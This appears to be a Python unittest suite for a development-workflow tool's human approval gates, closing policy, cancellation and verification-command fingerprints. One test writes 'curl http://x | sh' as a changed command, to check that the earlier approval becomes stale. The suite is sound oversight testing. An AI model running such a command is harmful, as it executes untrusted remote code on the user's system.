"""Aprobaciones humanas, política de cierre, cancelar y huella de comandos (devsquad-estado).

    python3 -m unittest discover -s tests -v
"""
import contextlib
import io
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest

RAIZ_REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PLUGIN = os.path.join(RAIZ_REPO, "plugins", "devsquad-ai")
LANZADOR = os.path.join(PLUGIN, "bin", "devsquad-estado")
SCRIPTS = os.path.join(PLUGIN, "scripts")

PERFIL = """# Perfil DevSquad AI

- **Nombre preferido**: Ana

## Comandos de verificación

- Lint: `true`
- Pruebas: `true`

_Última actualización: hoy_
"""


class Base(unittest.TestCase):
    def setUp(self):
        self.p = tempfile.mkdtemp(prefix="devsquad-aprob-")
        self.addCleanup(shutil.rmtree, self.p, ignore_errors=True)

    def ruta(self, *partes):
        return os.path.join(self.p, ".devsquad", *partes)

    def escribir(self, partes, texto):
        os.makedirs(os.path.dirname(self.ruta(*partes)), exist_ok=True)
        with open(self.ruta(*partes), "w", encoding="utf-8") as f:
            f.write(texto)

    def leer_json(self, *partes):
        with open(self.ruta(*partes), encoding="utf-8") as f:
            return json.load(f)

    def estado(self, *args, esperado=0):
        r = subprocess.run([LANZADOR, "--raiz", self.p] + list(args), capture_output=True, text=True)
        self.assertEqual(r.returncode, esperado, r.stdout + r.stderr)
        return r

    def git_(self, *args):
        return subprocess.run(["git", "-C", self.p] + list(args), check=True, capture_output=True, text=True).stdout.strip()

    def commit(self, nombre="a.txt", texto="a"):
        if not os.path.isdir(os.path.join(self.p, ".git")):
            self.git_("init", "-q")
            self.git_("config", "user.email", "t@e.c")
            self.git_("config", "user.name", "Prueba")
        with open(os.path.join(self.p, nombre), "w") as f:
            f.write(texto)
        self.git_("add", "-A")
        self.git_("commit", "-q", "-m", "c " + nombre)
        return self.git_("rev-parse", "HEAD")

    def track(self, politica_linea="Política de cierre: humano", aprobar=True):
        self.estado("init")
        self.estado("crear", "inicial")
        self.escribir(("tracks", "001-inicial", "plan.md"), "## Tareas\n- [ ] 1 Una\n- [ ] 2 Dos\n")
        self.escribir(("arquitectura.md",), "# Arquitectura\n\n%s\n" % politica_linea)
        self.escribir(("diseno.md",), "# Diseño\n")
        self.escribir(("brd.md",), "# BRD — Inicial\n")
        if aprobar:
            self.estado("aprobar", "brd", "--fuente", "terminal", "--por", "Ana")
            self.estado("aprobar", "arquitectura", "--fuente", "terminal", "--por", "Ana")
            self.estado("aprobar", "diseno", "--fuente", "terminal", "--por", "Ana")

    def hasta_en_revision(self):
        self.track()
        self.estado("transicion", "listo")
        self.estado("transicion", "en_progreso")
        for t in ("1", "2"):
            self.estado("tarea", t, "hecha", "--commit", "abcdef1")
        self.estado("transicion", "en_revision")


class PruebasAprobacionParaListo(Base):
    def test_sin_aprobaciones_no_pasa_a_listo_y_dice_como_aprobar(self):
        self.track(aprobar=False)
        r = self.estado("transicion", "listo", esperado=1)
        self.assertIn("human approval", r.stderr)
        self.assertIn("/devsquad-ai:aprobar arquitectura", r.stderr)
        self.assertIn('subject "diseno"', r.stderr)

    def test_con_una_sola_aprobacion_no_pasa(self):
        self.track(aprobar=False)
        self.estado("aprobar", "arquitectura", "--fuente", "terminal")
        r = self.estado("transicion", "listo", esperado=1)
        self.assertIn("diseno", r.stderr)
        self.assertNotIn("arquitectura (", r.stderr)

    def test_con_las_dos_aprobaciones_pasa(self):
        self.track()
        self.estado("transicion", "listo")

    def test_el_registro_lleva_huella_fuente_quien_y_fecha(self):
        self.track()
        reg = self.leer_json("tracks", "001-inicial", "track.json")["aprobaciones"]["arquitectura"]
        self.assertEqual(len(reg["sha256"]), 64)
        self.assertEqual((reg["fuente"], reg["por"]), ("terminal", "Ana"))
        self.assertRegex(reg["fecha"], r"^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\dZ$")

    def test_aprobacion_obsoleta_si_cambia_el_documento(self):
        self.track()
        self.escribir(("diseno.md",), "# Diseño cambiado por el modelo\n")
        r = self.estado("transicion", "listo", esperado=1)
        self.assertIn("diseno.md changed", r.stderr)
        self.estado("aprobar", "diseno", "--fuente", "terminal")  # la persona vuelve a aprobar
        self.estado("transicion", "listo")

    def test_no_se_aprueba_un_documento_que_no_existe(self):
        self.estado("init")
        self.estado("crear", "x")
        r = self.estado("aprobar", "arquitectura", esperado=1)
        self.assertIn("nothing to approve", r.stderr)

    def test_validar_marca_aprobaciones_obsoletas_en_tracks_avanzados(self):
        self.track()
        self.estado("transicion", "listo")
        self.estado("validar")
        self.escribir(("arquitectura.md",), "# otra\n")
        r = self.estado("validar", esperado=1)
        self.assertIn("stale", r.stderr)

    def test_fuente_invalida(self):
        self.track(aprobar=False)
        self.estado("aprobar", "arquitectura", "--fuente", "modelo", esperado=2)


class PruebasPoliticaDeCierre(Base):
    def test_por_defecto_es_humano_y_queda_registrada_al_aprobar(self):
        self.track(politica_linea="(sin política declarada)")
        self.assertEqual(self.leer_json("tracks", "001-inicial", "track.json")["politica_cierre"], "humano")

    def test_variantes_de_formato_de_la_linea(self):
        for linea in ("**Política de cierre**: humano", "- Política de cierre: `humano`", "politica de cierre: Humano — por defecto"):
            d = tempfile.mkdtemp()
            self.addCleanup(shutil.rmtree, d, ignore_errors=True)
            sys.path.insert(0, SCRIPTS)
            import devsquad_estado as E
            self.assertEqual(E.politica_en_documento("# A\n%s\n" % linea), "humano", linea)

    def test_automatico_se_rechaza_mientras_no_exista_el_revisor(self):
        self.track(politica_linea="Política de cierre: automatico", aprobar=False)
        r = self.estado("aprobar", "arquitectura", "--fuente", "terminal", esperado=1)
        self.assertIn("reviewer", r.stderr)
        self.assertIn("phase C", r.stderr)
        self.assertNotIn("aprobaciones", self.leer_json("tracks", "001-inicial", "track.json"))

    def test_automatico_con_acento_tambien_se_rechaza(self):
        self.track(politica_linea="Política de cierre: automático", aprobar=False)
        self.estado("aprobar", "arquitectura", "--fuente", "terminal", esperado=1)

    def test_politica_desconocida_se_rechaza(self):
        self.track(politica_linea="Política de cierre: cuando sea", aprobar=False)
        r = self.estado("aprobar", "arquitectura", "--fuente", "terminal", esperado=1)
        self.assertIn("is not valid", r.stderr)

    def test_cambio_de_politica_en_una_reaprobacion_se_avisa(self):
        self.track()
        sys.path.insert(0, SCRIPTS)
        import devsquad_estado as E
        ruta = self.ruta("tracks", "001-inicial", "track.json")
        track = self.leer_json("tracks", "001-inicial", "track.json")
        track["politica_cierre"] = "automatico"  # simula un valor previo distinto
        with open(ruta, "w", encoding="utf-8") as f:
            json.dump(track, f)
        self.escribir(("arquitectura.md",), "# A\n\nPolítica de cierre: humano\n")
        r = self.estado("aprobar", "arquitectura", "--fuente", "terminal")
        self.assertIn("ATTENTION", r.stdout)

    def test_automatico_sin_revisor_no_cierra_aunque_este_escrito_en_track_json(self):
        self.hasta_en_revision()
        ruta = self.ruta("tracks", "001-inicial", "track.json")
        track = self.leer_json("tracks", "001-inicial", "track.json")
        track["politica_cierre"] = "automatico"
        with open(ruta, "w", encoding="utf-8") as f:
            json.dump(track, f)
        r = self.estado("cerrar", esperado=1)
        self.assertIn("reviewer", r.stderr)
        r = self.estado("validar", esperado=1)
        self.assertIn("without a reviewer agent", r.stderr)

    def test_automatico_cierra_con_criterios_objetivos_cuando_existe_el_revisor(self):
        """Con el revisor (simulado) el código cierra solo, sin aprobación humana."""
        sys.path.insert(0, SCRIPTS)
        import devsquad_estado as E
        self.track()
        self.estado("transicion", "listo")
        self.estado("transicion", "en_progreso")
        for t in ("1", "2"):
            self.estado("tarea", t, "hecha", "--commit", "abcdef1")
        self.estado("transicion", "en_revision")
        self.estado("transicion", "verificado")
        for n in ("revision.json", "verificacion.json"):
            self.escribir(("tracks", "001-inicial", n), json.dumps({"aprobado": True}))
        track = E.cargar_track(self.p, "001-inicial")
        track["politica_cierre"] = "automatico"
        E.guardar_track(self.p, track)
        original = E.revisor_disponible
        E.revisor_disponible = lambda: True
        try:
            self.assertIsNone(E.motivo_no_cerrable(self.p, E.cargar_track(self.p, "001-inicial")))
            with contextlib.redirect_stdout(io.StringIO()):
                self.assertEqual(E.main(["--raiz", self.p, "cerrar"]), 0)
        finally:
            E.revisor_disponible = original
        self.assertEqual(self.leer_json("tracks", "001-inicial", "track.json")["estado"], "cerrado")

    def test_automatico_exige_revision_y_verificacion_aprobadas(self):
        sys.path.insert(0, SCRIPTS)
        import devsquad_estado as E
        self.hasta_en_revision()
        self.estado("transicion", "verificado")
        track = E.cargar_track(self.p, "001-inicial")
        track["politica_cierre"] = "automatico"
        E.guardar_track(self.p, track)
        original = E.revisor_disponible
        E.revisor_disponible = lambda: True
        try:
            self.assertIn("revision.json is missing", E.motivo_no_cerrable(self.p, E.cargar_track(self.p, "001-inicial")))
        finally:
            E.revisor_disponible = original


class PruebasCierreHumano(Base):
    def test_cumplidos_los_criterios_sin_aprobacion_no_cierra(self):
        self.hasta_en_revision()
        self.commit()
        r = self.estado("cerrar", esperado=1)
        self.assertIn("closing policy `humano`", r.stderr)
        self.assertIn("/devsquad-ai:aprobar cierre", r.stderr)

    def test_aprobar_cierre_exige_criterios_objetivos(self):
        self.track()
        self.estado("transicion", "listo")
        self.estado("transicion", "en_progreso")
        self.commit()
        r = self.estado("aprobar", "cierre", esperado=1)
        self.assertIn("tasks still to complete", r.stderr)

    def test_aprobar_cierre_exige_git_con_commits(self):
        self.hasta_en_revision()
        r = self.estado("aprobar", "cierre", esperado=1)
        self.assertIn("Git", r.stderr)

    def test_con_aprobacion_ligada_al_commit_cierra(self):
        self.hasta_en_revision()
        head = self.commit()
        self.estado("aprobar", "cierre", "--fuente", "terminal", "--por", "Ana")
        reg = self.leer_json("tracks", "001-inicial", "track.json")["aprobaciones"]["cierre"]
        self.assertEqual(reg["commit"], head)
        self.estado("cerrar")
        self.assertEqual(self.leer_json("tracks", "001-inicial", "track.json")["estado"], "cerrado")

    def test_un_commit_nuevo_vuelve_obsoleta_la_aprobacion_de_cierre(self):
        self.hasta_en_revision()
        self.commit()
        self.estado("aprobar", "cierre", "--fuente", "terminal")
        self.commit("b.txt", "b")
        r = self.estado("cerrar", esperado=1)
        self.assertIn("stale", r.stderr)
        self.assertIn("new commits", r.stderr)
        self.estado("aprobar", "cierre", "--fuente", "terminal")  # la persona vuelve a aprobar el nuevo HEAD
        self.estado("cerrar")

    def test_los_ganchos_siguen_mandando_con_politica_humana(self):
        self.hasta_en_revision()
        self.commit()
        self.escribir(("tracks", "001-inicial", "revision.json"), json.dumps({"aprobado": True}))
        r = self.estado("aprobar", "cierre", esperado=1)
        self.assertIn("verificado", r.stderr)


class PruebasCancelar(Base):
    def test_cancelar_exige_motivo(self):
        self.track()
        self.estado("cancelar", esperado=2)  # --motivo es obligatorio
        r = self.estado("cancelar", "--motivo", " ", esperado=1)
        self.assertIn("reason", r.stderr)

    def test_cancelar_libera_el_lugar_y_conserva_el_historial(self):
        self.track()
        self.estado("transicion", "listo")
        self.estado("cancelar", "--motivo", "Cambió el alcance", "--fuente", "terminal", "--por", "Ana")
        track = self.leer_json("tracks", "001-inicial", "track.json")
        self.assertEqual(track["estado"], "cancelado")
        self.assertEqual(track["cancelacion"]["motivo"], "Cambió el alcance")
        self.assertEqual(track["cancelacion"]["estado_previo"], "listo")
        self.assertEqual((track["cancelacion"]["fuente"], track["cancelacion"]["por"]), ("terminal", "Ana"))
        for archivo in ("spec.md", "plan.md", "track.json"):
            self.assertTrue(os.path.exists(self.ruta("tracks", "001-inicial", archivo)))
        self.assertIsNone(self.leer_json("estado.json")["track_activo"])
        self.estado("crear", "siguiente")
        self.assertEqual(self.leer_json("estado.json")["track_activo"], "002-siguiente")
        self.estado("validar")  # un track cancelado no cuenta como abierto
    def test_un_track_bloqueado_tambien_se_cancela(self):
        self.track()
        self.estado("transicion", "listo")
        self.estado("transicion", "en_progreso")
        self.estado("transicion", "bloqueado")
        self.estado("cancelar", "--motivo", "Ya no se necesita")
        self.assertEqual(self.leer_json("tracks", "001-inicial", "track.json")["estado"], "cancelado")

    def test_no_se_cancela_dos_veces_ni_se_cierra_uno_cancelado(self):
        self.track()
        self.estado("cancelar", "--motivo", "Prueba")
        self.estado("cancelar", "--motivo", "Prueba", "--track", "001-inicial", esperado=1)
        self.estado("cerrar", "--track", "001-inicial", esperado=1)
        self.estado("aprobar", "arquitectura", "--track", "001-inicial", esperado=1)

    def test_transicion_no_puede_cancelar(self):
        self.track()
        self.estado("transicion", "cancelado", esperado=2)

    def test_estado_cuenta_los_cancelados(self):
        self.track()
        self.estado("cancelar", "--motivo", "Prueba")
        datos = json.loads(self.estado("estado", "--json").stdout)
        self.assertEqual(datos["tracks_cancelados"], 1)
        self.assertIsNone(datos["track_activo"])


class PruebasHuellaDeComandos(Base):
    def setUp(self):
        super().setUp()
        self.escribir(("perfil.md",), PERFIL)
        self.estado("init")

    def test_aprobar_guarda_la_huella_y_la_lista(self):
        self.estado("aprobar", "comandos", "--fuente", "terminal", "--por", "Ana")
        reg = self.leer_json("estado.json")["comandos_aprobados"]
        self.assertEqual(reg["comandos"], ["true", "true"])
        self.assertEqual(len(reg["sha256"]), 64)

    def test_sin_comandos_declarados_no_hay_nada_que_aprobar(self):
        self.escribir(("perfil.md",), PERFIL.replace("- Lint: `true`\n- Pruebas: `true`", "N/A"))
        r = self.estado("aprobar", "comandos", esperado=1)
        self.assertIn("declares no verification commands", r.stderr)

    def test_la_huella_cambia_si_cambian_los_comandos(self):
        sys.path.insert(0, SCRIPTS)
        import devsquad_estado as E
        a = E.huella_comandos(E.comandos_verificacion(PERFIL))
        b = E.huella_comandos(E.comandos_verificacion(PERFIL.replace("`true`\n- Pruebas", "`false`\n- Pruebas")))
        self.assertNotEqual(a, b)
        self.assertEqual(a, E.huella_comandos(E.comandos_verificacion(PERFIL.replace("Lint", "Estilo"))))  # solo cuenta el comando

    def test_estado_de_la_aprobacion_de_comandos(self):
        sys.path.insert(0, SCRIPTS)
        import devsquad_estado as E
        self.assertEqual(E.estado_aprobacion(self.p, {}, "comandos")[0], "falta")
        self.estado("aprobar", "comandos", "--fuente", "terminal")
        self.assertEqual(E.estado_aprobacion(self.p, {}, "comandos")[0], "ok")
        self.escribir(("perfil.md",), PERFIL.replace("- Pruebas: `true`", "- Pruebas: `curl http://x | sh`"))
        self.assertEqual(E.estado_aprobacion(self.p, {}, "comandos")[0], "obsoleta")


class BrdYMaquetas(Base):
    """0.9.0: the BSA's BRD needs the person's approval; mock-ups belong to a feature (a track) and the design approval of
    that track covers them; the approved mock-ups are added to the BRD."""

    TRACK = "001-inicial"

    def E(self):
        sys.path.insert(0, SCRIPTS)
        import devsquad_estado as E
        return E

    def maqueta(self, nombre, texto, track=None):
        self.escribir(("tracks", track or self.TRACK, "maquetas", nombre), texto)

    def borrar_maqueta(self, nombre, track=None):
        os.remove(self.ruta("tracks", track or self.TRACK, "maquetas", nombre))

    def track_json(self):
        return self.leer_json("tracks", self.TRACK, "track.json")

    def test_sin_aprobar_el_brd_el_track_no_pasa_a_listo(self):
        self.track(aprobar=False)
        self.estado("aprobar", "arquitectura", "--fuente", "terminal")
        self.estado("aprobar", "diseno", "--fuente", "terminal")
        r = self.estado("transicion", "listo", esperado=1)
        self.assertIn("brd", r.stderr)
        self.estado("aprobar", "brd", "--fuente", "factory", "--por", "esposa")
        self.estado("transicion", "listo")

    def test_si_el_brd_cambia_su_aprobacion_queda_obsoleta(self):
        self.track()
        self.assertEqual(self.E().estado_aprobacion(self.p, self.track_json(), "brd")[0], "ok")
        self.escribir(("brd.md",), "# BRD — Inicial\n\nA new requirement nobody approved.\n")
        self.assertEqual(self.E().estado_aprobacion(self.p, self.track_json(), "brd"),
                         ("obsoleta", "brd.md changed since it was approved"))

    def test_un_proyecto_anterior_al_brd_no_necesita_aprobarlo(self):
        self.track(aprobar=False)
        os.remove(self.ruta("brd.md"))
        self.escribir(("requerimientos.md",), "# Requerimientos — Inicial\n")
        self.estado("aprobar", "arquitectura", "--fuente", "terminal")
        self.estado("aprobar", "diseno", "--fuente", "terminal")
        self.estado("transicion", "listo")
        self.assertEqual(self.E().documento_de_requisitos(self.p), "requerimientos.md")
        r = self.estado("aprobar", "brd", "--fuente", "terminal", esperado=1)
        self.assertIn("brd.md does not exist", r.stderr)

    def test_una_funcionalidad_sin_pantallas_no_tiene_maquetas_y_su_huella_es_la_del_diseno(self):
        self.track(aprobar=False)
        E = self.E()
        self.assertEqual(E.maquetas(self.p, self.TRACK), [])
        self.assertEqual(E.huella_documento(self.p, "diseno", self.TRACK), E.sha256_archivo(self.ruta("diseno.md")))
        for o in ("brd", "arquitectura", "diseno"):
            self.estado("aprobar", o, "--fuente", "terminal")                       # approving needs no mock-up
        self.assertEqual(E.faltan_aprobaciones_para_listo(self.p, self.track_json()), [])

    def test_la_aprobacion_del_diseno_cubre_las_maquetas_de_esa_funcionalidad(self):
        self.track(aprobar=False)
        self.maqueta("inicio.html", "<!doctype html><title>Inicio</title>")
        self.maqueta("nueva-cita.html", "<!doctype html><title>Nueva cita</title>")
        self.estado("aprobar", "diseno", "--fuente", "factory", "--por", "esposa")
        self.assertEqual(self.track_json()["aprobaciones"]["diseno"]["maquetas"], ["inicio.html", "nueva-cita.html"])
        E = self.E()
        self.assertEqual(E.estado_aprobacion(self.p, self.track_json(), "diseno")[0], "ok")
        self.maqueta("inicio.html", "<!doctype html><title>Inicio!</title>")          # one character in one mock-up
        st, det = E.estado_aprobacion(self.p, self.track_json(), "diseno")
        self.assertEqual(st, "obsoleta")
        self.assertIn("mock-up", det)
        self.maqueta("inicio.html", "<!doctype html><title>Inicio</title>")
        self.assertEqual(E.estado_aprobacion(self.p, self.track_json(), "diseno")[0], "ok")
        self.maqueta("pagos.html", "<!doctype html><title>Pagos</title>")             # a new screen nobody approved
        self.assertEqual(E.estado_aprobacion(self.p, self.track_json(), "diseno")[0], "obsoleta")
        self.borrar_maqueta("pagos.html")
        self.borrar_maqueta("nueva-cita.html")
        self.assertEqual(E.estado_aprobacion(self.p, self.track_json(), "diseno")[0], "obsoleta")

    def test_las_maquetas_de_otra_funcionalidad_no_afectan_la_aprobacion(self):
        self.track(aprobar=False)
        self.maqueta("inicio.html", "<!doctype html><title>Inicio</title>")
        for o in ("brd", "arquitectura", "diseno"):
            self.estado("aprobar", o, "--fuente", "terminal")
        self.maqueta("pagos.html", "<!doctype html><title>Pagos</title>", track="002-pagos")      # another feature
        self.maqueta("inicio.html", "<!doctype html><title>Otra cosa</title>", track="002-pagos")
        self.assertEqual(self.E().faltan_aprobaciones_para_listo(self.p, self.track_json()), [])

    def test_si_la_maqueta_cambia_el_coder_queda_bloqueado(self):
        self.track(aprobar=False)
        self.maqueta("inicio.html", "<!doctype html><title>Inicio</title>")
        for o in ("brd", "arquitectura", "diseno"):
            self.estado("aprobar", o, "--fuente", "terminal")
        self.assertEqual(self.E().faltan_aprobaciones_para_listo(self.p, self.track_json()), [])
        self.maqueta("inicio.html", "<!doctype html><title>Otra cosa</title>")
        faltas = self.E().faltan_aprobaciones_para_listo(self.p, self.track_json())
        self.assertEqual(len(faltas), 1)
        self.assertTrue(faltas[0].startswith("diseno (diseno.md or a mock-up of this feature changed"))

    def test_solo_cuentan_los_html_de_la_carpeta_y_no_los_enlaces(self):
        self.track(aprobar=False)
        self.maqueta("inicio.html", "<!doctype html>")
        self.maqueta("notas.txt", "x")
        self.maqueta(os.path.join("sub", "x.html"), "x")
        os.symlink(self.ruta("diseno.md"), self.ruta("tracks", self.TRACK, "maquetas", "enlace.html"))
        self.assertEqual(self.E().maquetas(self.p, self.TRACK), ["inicio.html"])

    # --- the approved mock-ups go into the BRD (Omar, 2026-11-12) ---
    def test_al_aprobar_el_diseno_las_maquetas_se_agregan_al_brd_y_su_aprobacion_se_renueva(self):
        self.track(aprobar=False)
        self.estado("aprobar", "brd", "--fuente", "terminal", "--por", "Ana")
        self.maqueta("inicio.html", "<!doctype html><title>Inicio</title>")
        self.maqueta("nueva-cita.html", "<!doctype html><title>Nueva cita</title>")
        r = self.estado("aprobar", "diseno", "--fuente", "factory", "--por", "esposa")
        self.assertIn("added to brd.md", r.stdout)
        self.assertIn("BRD approval was renewed", r.stdout)
        with open(self.ruta("brd.md"), encoding="utf-8") as f:
            brd = f.read()
        self.assertIn("## Approved designs", brd)
        self.assertIn("| inicio | `.devsquad/tracks/001-inicial/maquetas/inicio.html` |", brd)
        self.assertIn("| nueva-cita | `.devsquad/tracks/001-inicial/maquetas/nueva-cita.html` |", brd)
        reg = self.track_json()["aprobaciones"]["brd"]
        self.assertEqual((reg["por"], reg["via"]), ("esposa", "diseno"))
        self.assertEqual(self.E().estado_aprobacion(self.p, self.track_json(), "brd")[0], "ok")      # still valid
        self.estado("aprobar", "diseno", "--fuente", "factory", "--por", "esposa")                  # again: replaced, not repeated
        with open(self.ruta("brd.md"), encoding="utf-8") as f:
            self.assertEqual(f.read().count("## Approved designs"), 1)

    def test_un_brd_sin_aprobar_no_recibe_una_aprobacion_por_agregarle_los_disenos(self):
        self.track(aprobar=False)
        self.maqueta("inicio.html", "<!doctype html><title>Inicio</title>")
        self.estado("aprobar", "diseno", "--fuente", "factory", "--por", "esposa")
        with open(self.ruta("brd.md"), encoding="utf-8") as f:
            self.assertIn("## Approved designs", f.read())
        self.assertNotIn("brd", self.track_json()["aprobaciones"])                                  # code never blesses it
        r = self.estado("aprobar", "brd", "--fuente", "terminal", "--por", "Ana")
        self.assertEqual(self.E().estado_aprobacion(self.p, self.track_json(), "brd")[0], "ok")

    def test_un_brd_obsoleto_no_se_renueva_al_agregarle_los_disenos(self):
        self.track()
        self.escribir(("brd.md",), "# BRD — Inicial\n\nChanged after the approval.\n")
        self.maqueta("inicio.html", "<!doctype html><title>Inicio</title>")
        self.estado("aprobar", "diseno", "--fuente", "factory", "--por", "esposa")
        self.assertEqual(self.E().estado_aprobacion(self.p, self.track_json(), "brd")[0], "obsoleta")

    def test_sin_maquetas_el_brd_no_se_toca(self):
        self.track(aprobar=False)
        antes = open(self.ruta("brd.md"), encoding="utf-8").read()
        self.estado("aprobar", "diseno", "--fuente", "factory", "--por", "esposa")
        self.assertEqual(open(self.ruta("brd.md"), encoding="utf-8").read(), antes)


if __name__ == "__main__":
    unittest.main()
